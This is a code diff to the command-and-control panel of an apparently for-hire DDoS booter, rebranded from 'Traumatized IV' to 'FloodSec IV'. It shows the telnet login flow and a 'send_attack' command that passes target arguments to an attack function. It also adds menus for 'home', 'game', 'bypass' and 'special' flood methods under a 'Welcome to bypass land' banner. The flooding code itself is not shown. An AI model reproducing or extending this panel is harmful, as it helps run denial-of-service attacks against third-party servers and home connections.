@@ -1,5 +1,5 @@
 /*
-*@title: Traumatized IV
+*@title: FloodSec IV
 *@since: 2/28/21
 *@creator: n4n0
 */
@@ -22,7 +22,7 @@ const eExtra = require("./CNC/Extra/functions.js");
 
 
 Server.svr.on('connection', async function(socket) {
-    eExtra.set_TerminalSize(26, 80, socket);
+    eExtra.set_TerminalSize(30, 80, socket);
 
     /*
     *                           CONNECTING USER
@@ -31,7 +31,7 @@ Server.svr.on('connection', async function(socket) {
     /* Getting Connecting User IP/PORT */
     Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
 
-    eExtra.set_Title("Traumatized IV | [API]: 1 | ", socket)
+    eExtra.set_Title("FloodSec IV | [API]: 1 | ", socket)
 
     /* Showing the connecting user on server side terminal! */
     console.log('A new connection has been established\r\nClient IP: ' + Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT + "\r\n");
@@ -48,7 +48,7 @@ Server.svr.on('connection', async function(socket) {
     //Get Username
     socket.write(Banners.login_b());
     eExtra.set_cursor(9, 37, socket);
-    eExtra.set_Title("                                                  Traumatized VI | Welcome to bypass land | [APIs]: 1", socket);
+    eExtra.set_Title("                                                  FloodSec VI | Welcome to bypass land | [APIs]: 1", socket);
     let username = await ServerFunc.getInput(socket, "");
 
     socket.write(Config.Colors.Clear);
@@ -65,7 +65,7 @@ Server.svr.on('connection', async function(socket) {
     let login_resp = Auth.login(username, password, Server.Socket_Info.UserIP);
     if(login_resp.includes("Successfully")) {
         socket.write(Banners.main_b());
-        socket.write("                   Welcome To Traumatized Bypass Land, " + username + "\r\n");
+        socket.write("                   Welcome To FloodSec Bypass Land, " + username + "\r\n");
     } else {
         socket.write(Config.Colors.Clear + "Error, Invalid Info!");
         await eExtra.sleep(3000).then(() => {
@@ -108,9 +108,14 @@ Server.svr.on('connection', async function(socket) {
             console.log(eConfig.CurrentCmd.arg);
             socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
         } else if(eConfig.CurrentCmd.Cmd === "methods") {
-            if(eConfig.CurrentCmd.arg[1] == "1") {
-                
-                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Home_HomeM() + Config.hostname(Current[0]))
+            if(eConfig.CurrentCmd.arg[1] == "home") {
+                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Home_HomeM() + Config.hostname(Current[0]));
+            } else if(eConfig.CurrentCmd.arg[1] === "game") {
+                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Game_GameM() + Config.hostname(Current[0]));
+            } else if(eConfig.CurrentCmd.arg[1] === "bypass") {
+                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Bypass_BypaM() + Config.hostname(Current[0]));
+            } else if(eConfig.CurrentCmd.arg[1] === "special") {
+                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Special_SpecM() + Config.hostname(Current[0]));
             } else {
                 socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
             }
